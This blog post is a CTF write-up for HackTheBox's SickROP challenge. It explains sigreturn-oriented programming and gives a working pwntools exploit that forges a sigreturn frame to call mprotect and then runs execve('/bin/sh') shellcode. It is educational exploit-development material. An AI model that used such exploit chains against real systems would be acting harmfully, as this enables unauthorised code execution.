<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Return to Sigreturn" /><meta property="og:locale" content="en" /><meta name="description" content="A really simple writeup for an srop challenge." /><meta property="og:description" content="A really simple writeup for an srop challenge." /><link rel="canonical" href="https://faultpoint.com/posts/How-to-srop/" /><meta property="og:url" content="https://faultpoint.com/posts/How-to-srop/" /><meta property="og:site_name" content="FaultPoint" /><meta property="og:image" content="https://faultpoint.com/assets/posts/2023-09-11-1/9.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-09-11T00:00:00-04:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://faultpoint.com/assets/posts/2023-09-11-1/9.png" /><meta property="twitter:title" content="Return to Sigreturn" /><meta name="twitter:site" content="@elbee_ez" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-09-11T00:00:00-04:00","datePublished":"2023-09-11T00:00:00-04:00","description":"A really simple writeup for an srop challenge.","headline":"Return to Sigreturn","image":"https://faultpoint.com/assets/posts/2023-09-11-1/9.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://faultpoint.com/posts/How-to-srop/"},"url":"https://faultpoint.com/posts/How-to-srop/"}</script><title>Return to Sigreturn | FaultPoint</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/fp_logo_transparent.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">FaultPoint</a><p class="site-subtitle fst-italic mb-0">An assortment of vulnerability research, technical posts, and unfunny puns</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/elbee-cyber" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/elbee_ez" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dontopenthis','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Return to Sigreturn</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Return to Sigreturn</h1><p class="post-desc fw-light mb-4">A really simple writeup for an srop challenge.</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1694404800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Sep 11, 2023 </time> </span><div class="mt-3 mb-3"> <a href="/assets/posts/2023-09-11-1/9.png" class="popup img-link preview-img shimmer"><img src="/assets/posts/2023-09-11-1/9.png" alt="Preview Image" width="1200" height="630" loading="lazy"></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/elbee_ez">Dylan Knoff</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1464 words" > <em>8 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Return to Sigreturn</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Return to Sigreturn</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>How the sigreturn syscall can be used to provide water in a desert.</p><h1 id="table-of-content">Table of content</h1><ol><li><a href="#foreword">Foreword</a><li><a href="#sigreturn">What and why?</a><li><a href="#analysis">Analysis</a><li><a href="#landing">Landing in sigreturn</a><li><a href="#mprotect">Return to mprotect</a><li><a href="#full">Full exploit</a></ol><h3 id="forward"><span class="me-2">Forward</span><a href="#forward" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>People alot smarter than me have been inventing techniques for breaking binaries longer than I’ve been alive. And depending on the situation you find yourself in, there can be some very interesting ways to use a specific technique to achieve great effect and help with predicaments. It also goes to show that the struggle is not always about finding a vulnerability, but doing something actually useful with it. This post is going to go over SROP (ret2sigreturn) a technique that can be used to control registers in an environment where you may not have the appropiate gadgets or ability to do so.</p><h3 id="what-and-why"><span class="me-2">What and why</span><a href="#what-and-why" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Before going over the situations where ret2sigreturn would be useful and what it is, it might first be better to understand what the sigreturn syscall is. Sigreturn is a special syscall that assists the kernel with context switching when handling signals. This means both saving and restoring a process context. Because sigreturn is responsible for restoring context it also has code present that restores the context of each register. It does this via a sigreturn frame, sigreturn’s only parameter which holds the values of all registers which sigreturn has to restore. The following is the <a href="https://elixir.bootlin.com/glibc/glibc-2.29/source/sysdeps/mach/hurd/i386/sigreturn.c#L28">internals</a> to see what’s happening specifically.</p><p><a href="/assets/posts/2023-09-11-1/1.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/1.png" alt="" loading="lazy"></a></p><p>Sigreturn will pop segment registers, general purpose registers, flags and finally ret will restore the program counter. These are all pop instructions since sigreturn expects the sigreturn frame struct to be on the stack at this point. The technique here is crafting our own sigreturn frame and making the syscall to sigreturn. This would give us control over every register. So in an environment which lacks the appropiate gadgets or in which we cannot control something we need to, returning to sigreturn could prove a godsend option. The use-case situation is not dissimilar to the ret2dllresolve technique, in which we return to dllresolve to trick the linker into resolving uninitialized functions into the plt, but usually one of the two will be the obvious path to take compared to the other, say if you have a statically linked binary and there is no resolving. In this situation, not only would ret2dllresolve not be possible, but it would also make srop easier as lots of glibc functions are just wrappers around syscalls and thus there are syscall gadgets.</p><p>The main issue with ret2sigreturn, as made apparent by the source, is that it pops <strong>every</strong> register, including special purpose registers like cs and registers we don’t nessecarily want to control such as the stack pointer, which might be hard to set to somewhere appropiate without a leak. Because of this, we need to spend time crafting our forged sigreturn frame and consider everything including where we want to set the program counter and dealing with the forced stack pivot. Unlike ret2dllresolve, ret2sigreturn does require we have atleast prior control over the register used for making syscalls (rax on x86-64).</p><p>To better illustrate the concept we’ll go over the SickROP challenge from HackTheBox.</p><h3 id="analysis"><span class="me-2">Analysis</span><a href="#analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We are given a statically linked, non-stripped binary with DEP enabled.</p><p><a href="/assets/posts/2023-09-11-1/2.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/2.png" alt="" loading="lazy"></a></p><p>An initial review of the program reveals that it does not offer much in terms of functionality and only consists of one function (besides statically compiled functions and <code class="language-plaintext highlighter-rouge">_start</code>). The <code class="language-plaintext highlighter-rouge">vuln</code> function just reads from stdin and then echos it out to the screen with <code class="language-plaintext highlighter-rouge">write</code>. Observe in <code class="language-plaintext highlighter-rouge">_start</code> that this is looped forever.</p><p><a href="/assets/posts/2023-09-11-1/3.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/3.png" alt="" loading="lazy"></a></p><p>There is a very large buffer overflow, <code class="language-plaintext highlighter-rouge">0x300</code> is being passed as the size argument to <code class="language-plaintext highlighter-rouge">read</code> into var_28, which is only 32 bytes. This is likely to give us enough space for the sigreturn frame. Note that the buffer being passed to read (<code class="language-plaintext highlighter-rouge">var_28</code>) is on vuln’s stack frame.</p><p><a href="/assets/posts/2023-09-11-1/4.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/4.png" alt="" loading="lazy"></a></p><p>Unsuprisingly, this binary does not provide us many gadgets. We do not even have a gadget to control rax, our syscall register. We do however, have syscall gadgets from read and write.</p><p><a href="/assets/posts/2023-09-11-1/5.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/5.png" alt="" loading="lazy"></a></p><p>We need a way to control the rax gadget for our syscall number. Luckily for us rax is also used to store the return value on x86 and both <code class="language-plaintext highlighter-rouge">read</code> and <code class="language-plaintext highlighter-rouge">write</code> return the number of bytes they operated on as the return value. Thus we could send 15 bytes to read to have the right value for rax by the time of the overflow.</p><h3 id="landing-in-sigreturn"><span class="me-2">Landing in Sigreturn</span><a href="#landing-in-sigreturn" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We overwwrite the return address at an offset of 40 bytes, but it won’t matter if we return to a syscall without the right syscall number for sigreturn (15). My main workaround to get into sigreturn is to add <code class="language-plaintext highlighter-rouge">vuln</code> to the ROP chain, before the syscall gadget, that way I can set <code class="language-plaintext highlighter-rouge">rax</code>. So first we return to <code class="language-plaintext highlighter-rouge">vuln</code> and send 15 bytes, then we return to the syscall gadget.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">vuln</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040102e</span><span class="p">)</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000000000401014</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">40</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">vuln</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>

<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./sick_rop</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>

<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="sh">"</span><span class="s">b * 0x000000000040104e</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># ret
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">clean</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">14</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">clean</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Following this we can see that we end up at the syscall gadget after having called vuln again and sending it 15 bytes. So rax is set to the sigreturn syscall number.</p><p><a href="/assets/posts/2023-09-11-1/6.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/6.png" alt="" loading="lazy"></a></p><p>Following the syscall we see that we end up in sigreturn, note how all the registers were set to values from the stack at the time of the call, which were environment variables.</p><p><a href="/assets/posts/2023-09-11-1/7.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/7.png" alt="" loading="lazy"></a></p><p>Now that we have control over execution flow, we need to actually forge the sigreturn frame to send. Recall that this frame will need to include ALL registers in the respective order. Luckily pwntools provides magic that does this, so we do not have to tediously craft this frame ourselves.</p><h3 id="return-to-mprotect"><span class="me-2">Return to mprotect</span><a href="#return-to-mprotect" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that we can control all our needed registers, we can plan out an exploit. Ideally we could just return to <code class="language-plaintext highlighter-rouge">execve</code>, but the issue is there is no “/bin/sh” string present in the binary, you could easily read this string onto the new stack (which hopefully is somewhere without aslr) or make some other syscalls to get this string into memory, but I just opted to use the sigframe to setup for an <code class="language-plaintext highlighter-rouge">mprotect</code> syscall. By returning to <code class="language-plaintext highlighter-rouge">mprotect</code>, we can mark any section of the binary as executable, my plan was to use the sigreturn frame to move the stack somewhere useful in the text section and also make the whole text section executable. That way, after calling <code class="language-plaintext highlighter-rouge">mprotect</code>, I could return to <code class="language-plaintext highlighter-rouge">vuln</code> and simply get a shell using shellcode.</p><p>As seen my the syscall entry, mprotect takes three arguments. The start address, size and protection flag for the section we’d like to make executable.</p><p><a href="/assets/posts/2023-09-11-1/8.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/8.png" alt="" loading="lazy"></a></p><p>I organize the sigreturn frame to make the entire binary section executable passing the arguments according to calling convention. Recall we’re using pwntools magic, so ever register we do not specify to pwntools will be defaulted to zero.</p><p><a href="/assets/posts/2023-09-11-1/9.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/9.png" alt="" loading="lazy"></a></p><p>We set the program counter to the syscall gadget location, which is followed by a ret, so we also need to pivot the stack somewhere that points to the address of the next return location. After randomly running tele on different parts of the text segment, I found an address with a pointer to vuln, which was perfect.</p><p><a href="/assets/posts/2023-09-11-1/10.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/10.png" alt="" loading="lazy"></a></p><p>After returning to <code class="language-plaintext highlighter-rouge">vuln</code> and running vmmap, we can see that the text space is now executable.</p><p><a href="/assets/posts/2023-09-11-1/11.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/11.png" alt="" loading="lazy"></a></p><p>This doesn’t completely solve the string problem though, luckily there is a piece of assembly code present in the statically compiled read/write function.</p><p><a href="/assets/posts/2023-09-11-1/12.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/12.png" alt="" loading="lazy"></a></p><p>We could simply place the string at the right place on the stack, which will get moved into rsi, which we can then in turn provide shellcode that moves rsi into rdi. We can then have the return address point to our shellcode since it is in an area without address randomization.</p><p><a href="/assets/posts/2023-09-11-1/13.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/13.png" alt="" loading="lazy"></a></p><p><a href="/assets/posts/2023-09-11-1/14.png" class="popup img-link shimmer"><img src="/assets/posts/2023-09-11-1/14.png" alt="" loading="lazy"></a></p><h3 id="full-exploit"><span class="me-2">Full exploit</span><a href="#full-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">vuln</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040102e</span><span class="p">)</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000000000401014</span><span class="p">)</span>

<span class="sh">'''</span><span class="s">
/bin/sh -&gt; rsi
nop sled
mov    al,0x3b
mov    rdi,rsi
xor    rsi,rsi
xor    rdx,rdx
syscall
</span><span class="sh">'''</span>
<span class="n">execve</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="sh">"</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="se">\xB0\x3B\x48\x89\xF7\x48\x31\xF6\x48\x31\xD2\x0F\x05</span><span class="sh">"</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">11</span> 

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">40</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">vuln</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>
<span class="n">frame</span> <span class="o">=</span> <span class="nc">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span><span class="p">,</span> <span class="n">kernel</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span><span class="p">)</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">10</span> <span class="c1"># mprotect
</span><span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0000000000400000</span> <span class="c1"># addr
</span><span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x2000</span><span class="o">+</span><span class="mi">1000</span> <span class="c1"># len
</span><span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">7</span> <span class="c1"># prot
</span><span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="mh">0x00000000004010d8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./sick_rop</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>

<span class="c1">#gdb.attach(p, "b * 0x000000000040104e")
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">14</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">execve</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x4010c3</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/ctf/">CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/srop/" class="post-tag no-text-decoration" >srop</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Return%20to%20Sigreturn%20-%20FaultPoint&url=https%3A%2F%2Ffaultpoint.com%2Fposts%2FHow-to-srop%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Return%20to%20Sigreturn%20-%20FaultPoint&u=https%3A%2F%2Ffaultpoint.com%2Fposts%2FHow-to-srop%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ffaultpoint.com%2Fposts%2FHow-to-srop%2F&text=Return%20to%20Sigreturn%20-%20FaultPoint" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/ringbus/">Ringbus: Deferred Free Across Caches (Writeup)</a><li class="text-truncate lh-lg"> <a href="/posts/battelle-magical-goat/">Feed the Magical Goat (Battelle)</a><li class="text-truncate lh-lg"> <a href="/posts/ransomware-and-geopolitics-for-dummies/">International Implications of Ransomware for Dummies</a><li class="text-truncate lh-lg"> <a href="/posts/running-a-ctf-wo-lifesupport/">Running a CTF that Outlasts a Bag of Popcorn</a><li class="text-truncate lh-lg"> <a href="/posts/8-cves-on-the-wnr854t-junkyard/">'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/firmware-rev/">firmware rev</a> <a class="post-tag btn btn-outline-primary" href="/tags/embedded/">embedded</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/tags/badge/">badge</a> <a class="post-tag btn btn-outline-primary" href="/tags/chip-extraction/">chip extraction</a> <a class="post-tag btn btn-outline-primary" href="/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/tags/emulation/">emulation</a> <a class="post-tag btn btn-outline-primary" href="/tags/file-sim/">file-sim</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/ringbus/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1761883200" data-df="ll" > Oct 31, 2025 </time><h4 class="pt-0 my-2">Ringbus: Deferred Free Across Caches (Writeup)</h4><div class="text-muted"><p>Writing to modprobe using bad ring buffer handlers. Official writeup for my RSTCON25 challenge.</p></div></div></a></article><article class="col"> <a href="/posts/running-a-ctf-wo-lifesupport/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1694404800" data-df="ll" > Sep 11, 2023 </time><h4 class="pt-0 my-2">Running a CTF that Outlasts a Bag of Popcorn</h4><div class="text-muted"><p>Tales and experiences from running PatriotCTF 2023.</p></div></div></a></article><article class="col"> <a href="/posts/battelle-magical-goat/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1679544000" data-df="ll" > Mar 23, 2023 </time><h4 class="pt-0 my-2">Feed the Magical Goat (Battelle)</h4><div class="text-muted"><p>Reversing challenge from Battelle showcasing angr's file simulation feature.</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/ransomware-and-geopolitics-for-dummies/" class="btn btn-outline-primary" aria-label="Older" ><p>International Implications of Ransomware for Dummies</p></a> <a href="/posts/running-a-ctf-wo-lifesupport/" class="btn btn-outline-primary" aria-label="Newer" ><p>Running a CTF that Outlasts a Bag of Popcorn</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/elbee_ez">Dylan Knoff</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/firmware-rev/">firmware 